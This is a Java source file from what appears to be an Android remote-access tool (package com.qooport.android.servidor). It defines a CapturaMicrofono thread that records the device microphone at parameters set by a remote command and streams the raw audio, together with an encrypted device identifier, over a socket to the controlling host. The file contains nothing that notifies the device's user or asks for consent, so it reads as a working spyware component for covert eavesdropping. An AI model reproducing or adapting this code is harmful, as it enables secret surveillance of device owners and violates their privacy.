package com.qooport.android.servidor;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.util.Log;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;
import java.util.logging.Level;
import java.util.logging.Logger;
import com.qooport.android.Servicio;
import com.qooport.android.Principal;
import com.qooport.android.utilidades.Compresor;
import com.qooport.android.utilidades.Protocolo;
import com.qooport.android.utilidades.cifrado.Encriptacion;
public class CapturaMicrofono extends Thread {
    private Servicio conexion;
    private int bufferSize;
    private ObjectOutputStream out;
    private ObjectInputStream in;
    public boolean activo;
    int frequency;
    int channelConfiguration;
    int audioEncoding;
    private AudioRecord audioRecord;
    public CapturaMicrofono(Servicio conex) {
        this.conexion = conex;
    }
    public void abrir(String tipo) {
        frequency = 8000;
        channelConfiguration = AudioFormat.CHANNEL_CONFIGURATION_MONO;
        audioEncoding = AudioFormat.ENCODING_PCM_8BIT; //default 8 bit
        try {
            int sampleSizeInBits = 8;
            int channels = 1;
            String[] partes = tipo.split(":");
            frequency = Integer.valueOf(partes[0]);
            sampleSizeInBits = Integer.valueOf(partes[1]);
            channels = Integer.valueOf(partes[2]);
            if (sampleSizeInBits <= 8) {
                audioEncoding = AudioFormat.ENCODING_PCM_8BIT;
            } else if (sampleSizeInBits <= 16) {
                audioEncoding = AudioFormat.ENCODING_PCM_16BIT;
            }
            if (channels == 2) {
                channelConfiguration = AudioFormat.CHANNEL_CONFIGURATION_STEREO;
            } else {
                channelConfiguration = AudioFormat.CHANNEL_CONFIGURATION_MONO;
            }
        } catch (Exception e) {
        }
        bufferSize = AudioRecord.getMinBufferSize(frequency, channelConfiguration, audioEncoding);
        bufferSize += 2048;
        audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC, frequency, channelConfiguration,
                audioEncoding, bufferSize * 10);
        activo = true;
    }
    public void cerrar() {
        try {
            activo = false;
            audioRecord.stop();
            audioRecord.release();
        } catch (Exception e) {
        }
    }
    @Override
    public void run() {
        try {
            Socket socket = new Socket(conexion.getHost(), (conexion.getPuertoTransferencias()));
            out = new ObjectOutputStream(socket.getOutputStream());
            in = new ObjectInputStream(socket.getInputStream());
            out.writeInt(Protocolo.audioAndroid);
            out.flush();
//            out.writeObject(Encriptacion.cifra(Principal.identificador));
            out.writeObject(Compresor.comprimirGZIP(Encriptacion.cifra(Principal.identificador)));
            out.flush();
            audioRecord.startRecording();
            while (activo) {
                try {
                    byte buffer[] = new byte[bufferSize];
                    int bufferReadResult = audioRecord.read(buffer, 0, bufferSize);
                    out.writeObject(buffer);
                } catch (Exception ex) {
                    conexion.enviarMensaje("MICROFONO: Error al hacer captura:" + ex.getMessage());
                    Log.e("MICROFONO", "Error al hacer captura");
                    activo = false;
                }
            }
            out.close();
            cerrar();
        } catch (IOException ex) {
            Logger.getLogger(CapturaMicrofono.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
}
